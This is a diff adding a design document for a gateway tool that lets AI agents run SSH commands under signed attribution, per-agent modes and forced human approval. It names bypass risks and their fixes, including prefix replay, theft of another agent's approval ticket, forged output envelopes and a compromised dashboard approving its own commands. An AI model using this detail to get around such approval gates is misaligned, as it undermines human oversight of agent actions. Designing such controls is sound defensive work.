+                 │  ran     → store an F5 result, return output (≤ 64 KiB tail)
+                 │  pending → return {status:"pending", request_id}
+                 │  refused → return the reason
+```
+
+Direct SSH keeps its current text output; **only** a request carrying a valid
+`ESHU_MCP=1` gets the envelope, so F5's golden output test stays untouched.
+
+#### 2. The MCP tool
+
+`ssh_exec(host, command, session_id?, timeout?, wait?)`
+
+* `host` must match a registered gateway **IP or hostname** (`get_gateway` /
+  a name match, case-insensitive, unique). No arbitrary hosts, no user@, no
+  port, no `-o` — the host is looked up, never interpolated into the ssh
+  command line as free text.
+* `command` ≤ 8 KiB (the read-lane cap is a good fleet-wide default), with a
+  non-empty body. **G3:** refused when it has leading or trailing whitespace,
+  or any control character other than tab and newline — the gateway trims
+  before it hashes, so a command the gateway would change must never be
+  signed. **G2:** refused when its first word starts with `ESHU_`, because a
+  signed command must not look like a prefix. The accepted bytes then go to
+  the gateway **unmodified**.
+* `session_id` is optional; when given it must be a session the caller owns
+  (same rule as F3's tools). It becomes `ESHU_SESSION_ID` in the signed prefix
+  and in the ticket (G2: never `ESHU_SESSION`).
+* `timeout` seconds, default 60, capped at 120. `wait: true` polls the
+  request row for up to 60 s instead of returning `pending` immediately.
+* Result: `{status: "ran"|"pending"|"refused", request_id, exit_code?,
+  output? (tail, ≤ 64 KiB), truncated?, reason?}`. Agent text is never
+  interpreted.
+
+#### 3. Agent policy
+
+`agent_policies` gains:
+
+* `ssh_hosts_allow` — comma/JSON list of gateway IPs or hostnames; empty means
+  **none** (opt-in), `*` means any registered gateway.
+* `ssh_mode` — `read_only` | `approval` | `normal` (default `approval`).
+  * `read_only`: a command that `core/read_policy.is_read_ssh` does not prove
+    read-only is **refused** with `{status: "refused", reason: "read-only
+    agent"}`, and no request is created. (Reviewer S1: queueing a write for a
+    tired operator is the risk this mode exists to remove.)
+  * `approval`: every command is forced to JIT, reads included (the strictest
+    useful mode for a new agent).
+  * `normal`: the gateway's own policy decides, as for a direct SSH agent.
+* Rate limit per agent (requests/minute) shared with the MCP call budget.
+
+The dashboard check is **additive**: the gateway still runs freeze, blocklists,
+allowlists, windows, Zero-Trust, JIT and (for a request it auto-runs) the read
+lane exactly as today. The only levers the dashboard sends are
+`ESHU_FORCE_JIT`, which widens gating, and the signed identity, which
+attribution and the ticket use. A bug in the dashboard policy can only make a
+command *more* gated, never less.
+
+#### 4. The dashboard SSH key, the key line and the host-key pin
+
+* Key: `$ESHU_SSH_KEY_DIR` (default `/var/lib/eshu/ssh/`) holds
+  `dashboard_ed25519`, generated once at startup if missing (ed25519, no
+  passphrase — it is a service key), directory `0700` and owned by the service
+  user, key `0600`. The runner **refuses to start a call** if either mode or
+  owner is wrong (reviewer answer 4). `GET /api/ssh-key` returns the public
+  line (no secret: a public key) so an operator can add it by hand, and the
+  installer fetches it from `/api/ssh-key` automatically.
+* Installer: the dashboard line **reuses today's option set and forced
+  command** — `restrict`, `no-port-forwarding`, `no-X11-forwarding`,
+  `no-agent-forwarding`, `no-pty`, `from="<dashboard addresses>"`,
+  `command="/usr/bin/sudo /usr/local/bin/eshu-gateway.sh --dashboard-key"` —
+  and the installer writes **two** lines into `eshu-gateway`'s
+  `authorized_keys`: the existing shared-key line and the dashboard line.
+  Re-running the installer **replaces each line by its comment**
+  (`eshu-dashboard`, and the shared key's existing comment) instead of
+  appending, so it never duplicates either one. In `mcp_only` the installer
+  omits the shared-key line (and removes it on a re-run), which is how the
+  operator retires the shared key. The addresses are the resolved
+  `DASHBOARD_URL` host at install time plus the installer's existing
+  `ALLOWED_SSH_FROM` override for NAT/proxies (reviewer answer 2). **G6:**
+  the `--dashboard-key` argument is set by sshd's forced command, never by
+  the caller, and sudoers allows exactly two argv shapes —
+  `/usr/local/bin/eshu-gateway.sh` and
+  `/usr/local/bin/eshu-gateway.sh --dashboard-key`. The script refuses a call
+  that carries the marker without a valid signature, in every `ssh_mode`, so
+  a leaked key file that does not also hold the derived key runs nothing.
+  **G7:** when `ALLOWED_SSH_FROM` is set to anything other than the
+  dashboard's own address the installer prints a warning (every host in that
+  list can use the dashboard key).
+* Host keys: pinned per gateway in a new `gateways.ssh_host_key` column, which
+  stores the gateway's **public key line** (`ssh-ed25519 AAAA…`); its SHA256
+  fingerprint is what the UI shows and the audit records (a fingerprint alone
+  cannot be turned back into a `known_hosts` entry). The line arrives with the
+  gateway's **token-authenticated registration**: the installer reads the
+  host's `/etc/ssh/ssh_host_ed25519_key.pub` (falling back to whichever
+  `ssh_host_*_key.pub` exists) and sends it in `/api/register`; the heartbeat
+  also carries it. The dashboard never scans the host key over the network. A
+  gateway with **no pin is refused** (`ssh_host_unpinned`); a call to a pinned
+  gateway uses `StrictHostKeyChecking=yes` with a per-gateway known_hosts file
+  under the key directory; a **heartbeat with a different key raises an audit
+  event and does not re-pin**; re-pinning is an explicit, audited operator
+  action (`POST /api/gateways/{ip}/ssh-host-key`, session auth). (Reviewer R6.)
+* Runner: `ssh` from `subprocess` with a fixed argv (no shell), connecting to
+  the **registered IP** (never a resolved hostname), `-F /dev/null` (no user
+  or system `ssh_config`: no `ProxyCommand`, no `Match`),
+  `-o UserKnownHostsFile=<per-gateway pin file>`, `-o
+  GlobalKnownHostsFile=/dev/null`, `-o StrictHostKeyChecking=yes`,
+  `BatchMode=yes`, `ConnectTimeout=10`, `ServerAliveInterval=15`,
+  `-o IdentitiesOnly=yes`, no agent forwarding, no `-t`, `LANG=C`. (G7.)
+  Total wall clock is enforced by the caller with a timeout and a
+  process-group kill. **The timeout only bounds how long the agent waits**:
+  killing the local `ssh` does not stop the remote command, so F19
+  (unattended limits) is the real bound; until then keep `timeout` ≤ 120 s
+  (reviewer S2).
+
+#### 5. Attribution: the signed prefix
+
+```
+ESHU_AGENT=<agent> ESHU_AGENT_SIG=<hex> ESHU_TS=<unix> ESHU_NONCE=<hex>
+ESHU_MCP=1 [ESHU_FORCE_JIT=1] ESHU_SESSION_ID=<id>
+```
+
+* **Derived key (G1):** `K = HMAC-SHA256(gateway_token, "eshu-ssh-agent-v1")`,
+  and the MAC is `HMAC-SHA256(K, canonical)`. The label keeps the MAC from
+  being the bearer token's signature; rotating the gateway token rotates the
+  key (reviewer answer 1, confirmed by the security reviewer). **`K` is
+  computed when the token is set or rotated and stored in its own
+  `gateways.ssh_key_derived` column** (hex); the signing path reads only that
+  column and refuses with `ssh_key_unprovisioned` when it is empty. `K` never
+  appears in logs, in an API response or in an error message. Rows that
+  predate the column are backfilled once at startup, from the plaintext token
+  they still hold — after security Chunk 7 that token is gone, which is
+  exactly why the key must be derived now.
+* **`canonical` covers every prefix field** — agent, session, timestamp,
+  nonce, `mcp`, `force_jit` — **plus `sha256(command)` and the gateway's own
+  identity** (its registered IP). A signature is therefore valid for exactly
+  one command on exactly one gateway, and the test cases below are the point.
+* **Single use:** the nonce is random (16 bytes hex). The gateway keeps a
+  seen-nonce set for the validity window (±300 s) and refuses a repeat, so a
+  captured prefix cannot be replayed inside the window.
+* **G8: no prefix value in logs, ever.** The gateway logs `agent=<name>` and
+  `sig=ok|bad|none`, never the signature, the nonce or any `ESHU_*` value;
+  the command in the log line is the command after **every** prefix has been
+  stripped, `ESHU_SESSION_SIG` included. That delivers the Chunk 7 "stop
+  logging the session signature" item as part of F12.
+* **G2: the gateway refuses half-signed and ambiguous prefixes**, in every
+  `ssh_mode`:
+  * if any of `ESHU_AGENT`, `ESHU_AGENT_SIG`, `ESHU_TS`, `ESHU_NONCE`,
+    `ESHU_MCP`, `ESHU_FORCE_JIT` is present, then a valid signature is
+    required; missing fields, an out-of-window timestamp or a bad MAC is a
+    refusal, not something to ignore;
+  * a prefix key that appears twice is refused (the parse loop no longer
+    keeps the last value);
+  * the session gate accepts a valid agent MAC **in place of**
+    `ESHU_SESSION_SIG` for the session id it covers, and only then; without a
+    valid MAC, strict sessions still require the session signature;
+  * a missing signature is refused when the gateway's `ssh_mode` is
+    `mcp_only`, and ignored otherwise (direct SSH).
+* Charset rules are the existing ones: agent name `^[A-Za-z0-9_.:-]{1,64}$`,
+  session id as today, timestamp `[0-9]{1,12}` and nonce `[0-9a-f]{16,64}`,
+  `ESHU_MCP`/`ESHU_FORCE_JIT` `0|1`, so a prefix cannot smuggle shell.
+* The gateway passes the verified `agent` to `/api/request` and `/api/log`;
+  `requests.agent` (nullable, `''` = direct SSH) makes history, statistics and
+  overrides per-agent later. Audit rows record the agent on every MCP request.
+
+**A1 — the nonce store.** The gateway is a new process per SSH call, so the
+seen set is a file. G4 changes four things about where it lives and how it is
+written:
+
+* Path `$ESHU_NONCE_DIR/nonces` (`/var/lib/eshu/nonces`), in a **persistent**
+  root-owned `0700` directory (G4d). `/run` is cleared on reboot and a
+  container restarts in seconds, well inside the ±300 s window. The
+  installer creates the directory; the gateway creates it if missing and
+  **refuses the call if it cannot**. The store itself is `0600`.
+* One line per accepted nonce: `<unix ts> <nonce hex>`.
+* The write path takes an exclusive `flock` on a **separate lock file**
+  (`nonces.lock`), prunes to the ±300 s window, refuses a replay, enforces the
+  bound, **appends to a temp file and renames it into place** (G4b). An
+  `mv` either replaces the store or leaves it untouched, so a failed write
+  cannot leave an empty store that accepts every replay.
+* **Order (G4c):** charset → timestamp window → MAC → nonce, and the nonce
+  is written only after the MAC passes, so unsigned garbage from a shared-key
+  caller cannot fill the store and lock out signed calls.
+* Size bound: more than **4096** entries *after* pruning refuses new signed
+  calls (`nonce-store-full`) instead of evicting unexpired nonces. A full
+  store is an operator problem, not a reason to trust a replay.
+* Any lock/read/write failure refuses the call (`nonce-store-error`), so a
+  broken store fails closed.
+* N1 stays: the replay check matches the nonce **on its own** (`$2 == n`), so
+  a repeat is refused whatever timestamp it carries.
+
+```bash
+# G4: nonce store. Persistent dir, separate lock file, temp + rename.
+ESHU_NONCE_DIR="${ESHU_NONCE_DIR:-/var/lib/eshu}"
+ESHU_NONCE_FILE="$ESHU_NONCE_DIR/nonces"
+
+nonce_store_ready() {
+  if [ ! -d "$ESHU_NONCE_DIR" ]; then
+    install -d -m 700 -o root -g root "$ESHU_NONCE_DIR" 2>/dev/null || return 1
+  fi
+  [ ! -L "$ESHU_NONCE_DIR" ] || return 1
+  [ "$(stat -c '%a' "$ESHU_NONCE_DIR")" = "700" ] || return 1
+  [ "$(stat -c '%u' "$ESHU_NONCE_DIR")" = "0" ] || return 1
+  return 0
+}
+
+# Returns 0 accepted, 2 replay, 3 full, 1 store error.
+consume_nonce() {            # $1 = nonce hex, $2 = ts
+  local nonce="$1" ts="$2" now lo tmp rc=0
+  nonce_store_ready || return 1
+  now=$(date +%s)
+  lo=$((now - 300))
+  tmp=$(mktemp -p "$ESHU_NONCE_DIR" nonces.XXXXXX) || return 1
+  exec 9>>"$ESHU_NONCE_DIR/nonces.lock" || { rm -f "$tmp"; return 1; }
+  flock -w 2 9 || { rm -f "$tmp"; exec 9>&-; return 1; }
+  [ -f "$ESHU_NONCE_FILE" ] || : > "$ESHU_NONCE_FILE" || rc=1
+  if [ "$rc" = 0 ]; then
+    awk -v lo="$lo" '$1 >= lo' "$ESHU_NONCE_FILE" > "$tmp" || rc=1
+  fi
+  # N1: match the nonce on its own, so a repeat is refused whatever ts it
+  # carries (the MAC binds ts, but the store must not depend on that).
+  if [ "$rc" = 0 ] && awk -v n="$nonce" '$2 == n { f = 1 } END { exit !f }' "$tmp"; then rc=2; fi
+  if [ "$rc" = 0 ] && [ "$(wc -l < "$tmp")" -ge 4096 ]; then rc=3; fi
+  if [ "$rc" = 0 ]; then printf '%s %s\n' "$ts" "$nonce" >> "$tmp" || rc=1; fi
+  # G4b: rename, never truncate the live store.
+  if [ "$rc" = 0 ]; then mv -f "$tmp" "$ESHU_NONCE_FILE" 2>/dev/null || rc=1; fi
+  rm -f "$tmp"
+  exec 9>&-
+  return "$rc"
+}
+```
+
+Tests (gateway sandbox): two concurrent calls with the same nonce, exactly
+one passes; a stale entry is pruned and does not block a new nonce; a store
+at the bound refuses; an unwritable/locked-out store refuses; **G4b:** a
+write that fails after the temp file is created leaves the previous store
+intact; **G4c:** a bad MAC adds no entry; **G4d:** a replay after the store's
+directory is recreated is still refused (and the store survives a restart,
+i.e. it is not under `/run`).
+
+**A2 — canonical form and HMAC tooling.** The MACed string is fixed, one
+field per line, version first, and every field is validated against a charset
+that cannot contain `newline`:
+
+```
+v1
+<agent>            [A-Za-z0-9_.:-]{1,64}
+<session>          [A-Za-z0-9_.:-]{0,64}
+<mcp>              0 | 1
+<force_jit>        0 | 1
+<ts>               [0-9]{1,12}
+<nonce>            [0-9a-f]{16,64}
+<gateway>          the gateway's registered IP  [A-Za-z0-9_.:-]{1,64}
+<sha256(command)>  64 lowercase hex
+```
+
+`K = HMAC-SHA256(gateway_token, "eshu-ssh-agent-v1")`,
+`ESHU_AGENT_SIG = HMAC-SHA256(K, canonical)` (64 lowercase hex).
+
+The gateway already starts `python3` for `ESHU_SESSION_SIG`, so the new check
+reuses that shape — but the **key never goes on argv**: the helper reads
+`/etc/eshu-token` itself, the canonical string arrives on **stdin**, and only
+the signature is an argument.
+
+```bash
+canonical=$(printf 'v1\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s' \
+  "$ESHU_AGENT" "${ESHU_SESSION_ID:-}" "$ESHU_MCP" "${ESHU_FORCE_JIT:-0}" \
+  "$ESHU_TS" "$ESHU_NONCE" "$GATEWAY_IP" "$(printf '%s' "$cmd" | sha256sum | cut -d' ' -f1)")
+if printf '%s' "$canonical" | python3 - "$ESHU_AGENT_SIG" <<'PY'
+import hmac, hashlib, sys
+sig = sys.argv[1].strip()
+token = open('/etc/eshu-token', 'rb').read().strip()
+key = hmac.new(token, b'eshu-ssh-agent-v1', hashlib.sha256).digest()
+want = hmac.new(key, sys.stdin.buffer.read(), hashlib.sha256).hexdigest()
+sys.exit(0 if hmac.compare_digest(sig, want) else 1)
+PY
+then sig_state=ok; else sig_state=bad; fi
+```
+
+**Shared test vector** (dashboard and gateway tests use the same one): token
+`eshu-test-token`, agent `agent-a`, session `sess-1`, mcp `1`, force_jit `0`,
+ts `1700000000`, nonce `0123456789abcdef`, gateway `192.0.2.10`, command
+`uptime` (`sha256 = dd291cd6294bafef2a7e9c378eb320e87198d6dae214272addb569775750c802`):
+
+```
+v1
+agent-a
+sess-1
+1
+0
+1700000000
+0123456789abcdef
+192.0.2.10
+dd291cd6294bafef2a7e9c378eb320e87198d6dae214272addb569775750c802
+```
+
+→ `ESHU_AGENT_SIG = 8e16581e343844cc2d75453461d3464b4c36cd22ae046573093fa63f93db0b04`
+(derived key hex `04bfe393d32b73020113f6cefcec7ad1825272cfa3b48547e0648c5d2fa041d5`).
+The existing `ESHU_SESSION_SIG` helper still passes its key on argv; moving it
+to the same file-read shape is a small security Chunk 7 cleanup, not part of
+this design.
+
+#### 6. `ESHU_FORCE_JIT`, end to end
+
+The auto-run decisions are **not all on the gateway**: the allowlist and the
+window run there, but the F3 plan, session override, F4 read lane and host
+override run on the dashboard in `receive_request` (§ 2.6). Force-JIT has to
+cover both, or an `approval` agent's `uptime` would still be auto-approved by
+an active host override or the read lane:
+
+* **Gateway:** when `force_jit` is set and the signature is valid, the gateway
+  skips the allowlist and window auto-run stages and sends
+  `force_jit: true` (and the verified `agent`) to `/api/request`. Freeze, the
+  encoded-payload block, blocklists and Zero-Trust still win.
+* **Dashboard (`receive_request`):** when the request is force-jit, every
+  auto-approve path is skipped — F3 plan, session override, F4 read lane and
+  host override. It also **re-derives the mode from the agent's own policy**
+  (so the dashboard does not trust the prefix alone) and honours the stricter
+  of the two. The § 2.6 order is otherwise unchanged; freeze, the
+  encoded-payload block, blocklists and Zero-Trust still win.
+* Tests: for each auto path (allowlist, window, plan, session override, read
+  lane, host override), a `force_jit` request stays pending.
+
+#### 7. Approvals
+
+An MCP call cannot hang: in MCP mode the gateway creates the JIT row and
+returns `{status:"pending", request_id}` immediately instead of polling. The
+agent then:
+
+* polls `check_request(request_id)` (already exists) and calls `ssh_exec`
+  again once it is approved — the gateway's approved-ticket path runs the
+  approved bytes without creating a second request; or
+* calls `ssh_exec(..., wait: true)`, where the dashboard polls its own
+  `requests` row for up to 60 s and then performs the run. When the cap is
+  reached it returns `pending` with the `request_id`, never an error. The poll
+  is read-only; approvals still happen on the dashboard UI.
+
+**Tickets are bound to the agent and the session.** The approved ticket line
+carries `agent` and `session`, and `claim_lockbox_ticket` matches on the
+command bytes **and** those fields. An unsigned request (direct SSH) can claim
+only a ticket with no agent. Without this, any shared-key caller in
+`direct+mcp` could take agent A's approved ticket within the 90 s TTL, run it
+under its own identity and read the output. Tests: agent B cannot claim agent
+A's ticket; an unsigned caller cannot claim it; agent A claims it exactly once.
+
+**A4 — ticket format and compatibility (G5).** The approved ticket line becomes
+**`v2|<ts>|<agent>|<session>|<command>`**, with the command **last** so a `|`
+inside it survives. The tag is the first thing on the line, so the format is
+detected by the tag alone and never by counting `|`: an old `ts|cmd` line whose
+command happens to look like `agent|session|…` can never be read as a ticket
+for a shorter command. The dashboard builds the line from the request row it
+has just approved (`/api/poll` and `/api/ticket`; the poller forwards the
+string verbatim); `agent` and `session` are charset-checked like the rest, and
+`agent` is empty for direct SSH. Compatibility is explicit, in both
+directions:
+
+* a **new gateway** treats a line whose first field is not `v2` as old:
+  everything after the first `|` is the command, and the ticket is
+  agent-less (claimable only by an unsigned request);
+* a signed MCP request (agent non-empty) may only claim a `v2` ticket whose
+  agent and session fields equal its own, so it can never claim an old
+  agent-less line — the re-run after approval returns "no ticket for this
+  agent" instead of taking another agent's approval;
+* an unsigned request may claim an agent-less line (old or `v2`). It may
+  never claim a ticket with an agent;
+* the gateway's pruner and the poller's pruner both read the timestamp from
+  `$2` on a `v2` line and from `$1` on an old one. An old poller that only
+  knows `$1` would delete every `v2` line as stale, so **the poller and the
+  gateway are versioned together by the one installer**, and the dashboard
+  refuses `ssh_exec` to a gateway whose registration does not report
+  `ssh_ticket_format=v2` (`ssh_ticket_format`), the same fail-closed rule as
+  the agent-format check in §9;
+* once the fleet runs the new poller, `direct+mcp` gateways can keep serving
+  direct SSH with agent-less tickets and MCP with bound ones side by side.
+
+Tests, both directions: old line + new gateway (signed request refused,
+unsigned accepted); `v2` line + old poller (the dashboard's capability check
+refuses before signing); a `v2` line whose command looks like
+`agent|session|…` is not re-parsed; an old line whose command contains `|`
+keeps the whole command; `v2` line + new gateway (agent A claims exactly
+once; agent B and an unsigned caller cannot).
+
+#### 8. Output and the envelope
+
+* **The envelope is the only stdout in MCP mode.** The gateway captures all
+  command output (the F5 capture path, tail-capped at 64 KiB), base64-encodes
+  it **inside** the envelope, and prints exactly one line:
+  `ESHU-MCP-ENVELOPE {"status": …, "request_id": …, "exit_code": …,
+  "output_b64": …, "truncated": …}`. The marker is fixed and the dashboard
+  accepts exactly one envelope; any other stdout, a second envelope, or a
+  missing/garbled one is returned as `refused` with reason `bad-envelope`.
+  A command that prints an envelope-shaped line therefore cannot forge a
+  status or an exit code — its text comes back inside `output` (reviewer R5).
+* The gateway still posts the F5 `request_results` row against `request_id`
+  (the existing `post_exec_result` path, unchanged); the dashboard runs
+  `secret_scrub` (second pass), stores a row itself only when the gateway's
+  post did not land (`first result wins`), and returns at most 64 KiB to the
+  MCP client.
+* The envelope also carries `messages`: every human-facing line the gateway
+  would have printed on stdout (the `[LOCKED]` reasons, `[TIMEOUT]`,
+  `[DENIED]`, …) is JSON-escaped into it through `say()`, so an MCP caller
+  sees the same explanation an SSH caller sees, and the dashboard turns the
+  list into `reason` on `refused`/`pending`.
+* Stderr is merged into the same stream (as the gateway does today), so the
+  agent sees what a direct SSH agent would.
+
+**A3 — one `say()` helper, and the output cap.** The gateway prints on many
+paths, not just the command: the `[LOCKED]` messages (freeze, blocklist, hard
+block, session required/invalid, bad prefix, rate limit, JIT unreachable,
+encoded payload), the JIT status lines (`#N sent`, `[DENIED]`, `[TIMEOUT]`,
+`[EXPIRED]`, `[OK] Approved! Executing…`), the `[ESHU exit=N]` sentinel, and
+the command's own stream through `sanitize`. Every human-facing writer is
+routed through one helper:
+
+```bash
+# A3: the only human-facing writer. Direct mode prints; MCP mode appends the
+# line to the envelope's `messages` (JSON-escaped) and prints nothing.
+say() {
+  if [ "$ESHU_MCP" = "1" ]; then
+    ESHU_MSG_JSON="${ESHU_MSG_JSON:+$ESHU_MSG_JSON,}\"$(json_escape "$*")\""
+  else
+    printf '%s\n' "$*"
+  fi
+}
+```
+
+`[ESHU exit=N]` becomes `say`-free: in MCP mode it is `exit_code` in the
+envelope, not a stdout line. The command's own output never reaches stdout in
+MCP mode:
+
+```bash
+# A3: MCP mode captures the stream (F5's tee already fans it out) and keeps
+# its tail; direct mode is untouched.
+ESHU_MCP_CAP=$(mktemp -p "$ESHU_RUN_DIR" eshu-mcp.XXXXXX) || exit 1
+{ tail -c 65537 > "$ESHU_MCP_CAP" || true; cat > /dev/null; } < "$ESHU_OUT_FIFO" &
+...
+mcp_size=$(wc -c < "$ESHU_MCP_CAP")
+mcp_trunc=false; [ "$mcp_size" -gt 65536 ] && mcp_trunc=true
+mcp_b64=$(tail -c 65536 "$ESHU_MCP_CAP" | base64 -w0)
+# N2: request_id is the integer id, never the zero-padded DISPLAY_ID (which is
+# not a valid JSON number).
+printf 'ESHU-MCP-ENVELOPE {"status":"%s","request_id":%s,"exit_code":%s,"output_b64":"%s","truncated":%s,"messages":[%s]}\n' \
+  "$status" "$REQUEST_ID_INT" "$rc" "$mcp_b64" "$mcp_trunc" "$ESHU_MSG_JSON"
+```
+
+**The cap is 64 KiB for the MCP envelope** (the design's number). F5's
+16 KiB stays what it is for `request_results`: the stored execution result is
+a different artefact from the bytes handed to the MCP client, and 64 KiB is
+the MCP ceiling the note promised. The dashboard re-applies its own 64 KiB
+cap after decoding, so a gateway that sends more is still trimmed.
+
+Test: in MCP mode, stdout is **exactly one** `ESHU-MCP-ENVELOPE` line on
+every path — ran, pending, blocked, frozen, Zero-Trust, encoded payload and a
+bad signature — with no banner or status line outside it, and any other
+stdout makes the dashboard return `refused`/`bad-envelope`. The envelope's
+`request_id` is an integer (`REQUEST_ID_INT`), never the zero-padded
+`DISPLAY_ID` (N2).
+
+#### 9. Migration and launch
+
+* Per-gateway `ssh_mode` setting: `direct+mcp` (default) or `mcp_only`.
+  `mcp_only` makes the gateway require a valid `ESHU_AGENT_SIG` and refuse
+  unsigned requests, so the operator can retire the shared agent key one
+  gateway at a time. Additive: nothing changes until the operator flips it.
+* **Fail closed on the format.** `ssh_exec` refuses a gateway that has not
+  reported the capability, one whose reported MAC format predates this note
+  (`ssh_agent_v1`), one that has not reported `ssh_ticket_format=v2` (G5:
+  the poller that prunes the lockbox must understand the tag), and one with
+  no pinned host key. All four refusals name the reason (`ssh_not_ready`,
+  `ssh_agent_format`, `ssh_ticket_format`, `ssh_host_unpinned`) so the
+  operator knows what to update, and none of them signs anything.
+* The capabilities and the host key arrive with the **same installer** that
+  writes the gateway and poller scripts, in the installer's existing
+  `/api/register` call, so the reported pair is always the pair that is
+  installed. The dashboard stores them on the gateway row and shows the
+  reason in the refusal instead of guessing.
+
+#### 10. Tests to add (final)
+
+* **Policy**: unknown host refused (not registered, or not in
+  `ssh_hosts_allow`); `-o`/`user@`/port in `host` refused; a `read_only`
+  agent's write is refused and creates no request; an `approval` agent's
+  `uptime` is forced to JIT; rate limit. **G3:** a command with leading or
+  trailing whitespace, a `\r`, a NUL-like control byte (other than tab and
+  newline) is refused before signing; **G2:** a command whose first word
+  starts with `ESHU_` is refused.
+* **Signing**: a valid prefix with a different command is refused; the same
+  prefix (nonce) twice is refused; a prefix signed for gateway A is refused
+  on gateway B; a flipped `ESHU_MCP` or `ESHU_FORCE_JIT` is refused; a stale
+  timestamp and a bad hex sig are refused; the syslog line contains no
+  signature/nonce hex and no prefix value; `mcp_only` refuses direct SSH;
+  **G2:** a lone `ESHU_MCP=1`, a lone `ESHU_AGENT=`, a duplicate key, and a
+  prefix with a missing field are all refused in `direct+mcp` too; a valid
+  agent MAC satisfies the session gate in place of `ESHU_SESSION_SIG`, and
+  without a MAC strict sessions still demand the signature.
+* **G1**: `ssh_exec` refuses `ssh_key_unprovisioned` when the derived key
+  column is empty; setting a token computes and stores `K`; rotating the
+  token changes both `K` and the signature; `K` is absent from the API
+  responses and the audit rows.
+* **G4**: the four nonce-store cases of §5 A1 (failed write leaves the store
+  intact, bad MAC adds no entry, replay after the directory is recreated is
+  refused, store outside `/run`).
+* **G5**: old `ts|cmd` line + new gateway (signed refused, unsigned
+  accepted); old line whose command looks like `agent|session|cmd` stays
+  agent-less; `v2` line + old poller (refused at the capability check);
+  `v2` line + new gateway (agent A claims once; B and unsigned cannot).
+* **G6**: a call carrying `--dashboard-key` with no signature, or a bad one,
+  is refused in `direct+mcp` and `mcp_only`; the same call signed by the
+  authenticated agent runs; an unsigned call **without** the marker still
+  runs in `direct+mcp` (direct SSH unchanged); the generated sudoers allows
+  exactly the two argv shapes.
+* **G7**: a mismatch is refused and audited; a heartbeat with a new key does
+  not change the pin; re-pinning is audited; the timeout kills the process
+  group; the argv never goes through a shell, connects to the registered IP,
+  passes `-F /dev/null`, `UserKnownHostsFile=<pin>`,
+  `GlobalKnownHostsFile=/dev/null`; no pin means refused; the key dir/key
+  modes are enforced; `ALLOWED_SSH_FROM` different from the dashboard
+  address makes the installer warn.
+* **G8**: for every refusal path, the logged line contains the stripped
+  command only — no `ESHU_*` value, signature or nonce.
+* **Force-JIT**: for each auto path (allowlist, window, plan, session
+  override, read lane, host override), a force-jit request stays pending.
+* **Tickets**: agent B and an unsigned caller cannot claim agent A's ticket;
+  agent A claims it exactly once.
+* **Runner**: no pin means refused; a mismatch is refused and audited; the
+  timeout kills the process group; the key dir/key modes are enforced (the
+  rest of the runner cases are in G7 above).
+* **Flow**: pending → `check_request` → re-run consumes the ticket exactly
+  once; `wait: true` returns the run or times out to `pending`; a refused
+  command returns the reason and does not create a request.
+* **Output**: 64 KiB tail kept, truncation flag, `secret_scrub` applied, F5
+  result stored and visible in history; a command printing an envelope-shaped
+  line comes back inside `output` and the outer result is unchanged; any
+  other stdout is `bad-envelope`; in MCP mode there is exactly one envelope
+  on every path (ran, pending, blocked, frozen, Zero-Trust, encoded payload,
+  bad signature), `request_id` is an integer (N2), and a non-zero exit code
+  is `exit_code`, not a stdout line.
+* **Enrollment**: the generated `authorized_keys` has **both** lines, each
+  with `restrict` and the forced command, the dashboard line carries
+  `--dashboard-key` and the `eshu-dashboard` comment; re-running does not
+  duplicate either; `mcp_only` drops the shared-key line; both generated
+  installers (`dashboard/eshu-gateway-install.sh` and
+  `dashboard/static/eshu-gateway-install.sh`) are regenerated in the same
+  commit.
+* **Freeze**: `ssh_exec` is blocked while frozen; audit row written.
+
+#### 11. The five questions, answered
+
+The feature reviewer answered the round-1 open questions; they are now
+decisions, not questions:
+
+1. **Signing key:** derive `HMAC(token, "eshu-ssh-agent-v1")` and MAC with the
+   derived key, so rotating the token rotates it (§5). The security reviewer
+   still confirms the derivation.
+2. **`from=` and NAT:** keep `from=`, and reuse the installer's existing
+   `ALLOWED_SSH_FROM` for NAT or a proxy; never ship a line without `from=`
+   (§4).
+3. **`read_only`:** refuse non-reads; do not queue them (§3).
+4. **Key location:** default `/var/lib/eshu/ssh/` with
+   `ESHU_SSH_KEY_DIR`; refuse to run if the directory is not `0700`/owned or
+   the key not `0600` (§4).
+5. **`wait: true`:** keep it, capped at 60 s, returning `pending` with the
+   request id at the cap; `timeout` ≤ 120 s and F19 is the real remote bound
+   (§2, §7).
+
+#### 12. Accepted risk: the dashboard can start commands
+
+Until now the dashboard could approve a command but not start one: the
+gateway's forced command ran on the agent's own SSH connection. With the
+dashboard key it can start a command on every gateway that holds the key, so
+a **compromised dashboard can both start and approve its own commands**;
+JIT still runs on the gateway, but with the approval UI on the same host that
+holds the key, the human gate is only as strong as the dashboard. This is a
+real trust change and is accepted for the homelab threat model, with these
+mitigations:
+
+* `from="<dashboard addresses>"` on the key line, so a stolen key does not
+  work from anywhere else;
+* per-gateway `ssh_mode` with `direct+mcp` as the default, so sensitive
+  gateways can keep the key out entirely;
+* the key file is `0600` in a `0700` directory owned by the service user, and
+  the runner refuses to run otherwise;
+* an `ssh_exec` audit row per call (agent, gateway, command hash, request id,
+  outcome), on top of the gateway's own request/audit rows;
+* `mcp_only` is opt-in: it retires the shared agent key, it does not widen the
+  dashboard's reach.
+
+**Option for the security reviewer: a per-gateway "never accept the dashboard
+key" switch.** A gateway setting (`dashboard_key: never`, a checkbox, and an
+installer flag `--no-dashboard-key`) makes the installer omit the dashboard
+line (and remove it on a re-run); the server side then refuses to call that
+gateway with `ssh_exec` (`dashboard_key_disabled`) and the UI says so. That is
+the strongest available answer short of not shipping the key: the operator can
+keep the dashboard unable to start commands on the gateways that matter, at
+the cost of `ssh_exec` not working there. The design leaves the default at
+"key present" and asks the security reviewer to decide whether the switch
+should ship in this chunk or in F19/Chunk 7.
+
+#### Round 2: fixes for design review round 1
+
+* **R1** — the MAC now covers every prefix field, `sha256(command)` and the
+  gateway identity, with a single-use nonce; signature and nonce values never
+  reach syslog (§5).
+* **R2** — `ESHU_FORCE_JIT` is honoured end to end: the gateway skips
+  allowlist/window and marks the request, `receive_request` skips plan,
+  session override, read lane and host override and re-derives the mode from
+  the agent policy (§6).
+* **R3** — tickets are bound to agent and session; an unsigned caller can
+  claim only an agent-less ticket (§7).
+* **R4** — the dashboard key line reuses today's option set and forced
+  command; the installer writes both lines idempotently and drops the
+  shared-key line in `mcp_only` (§4).
+* **R5** — the envelope is the only stdout; all command output is base64
+  inside it; anything else is `bad-envelope` (§8).
+* **R6** — the host key is pinned from the token-authenticated registration
+  and heartbeat, never scanned; no pin means refused; a new key audits and
+  does not re-pin (§4).
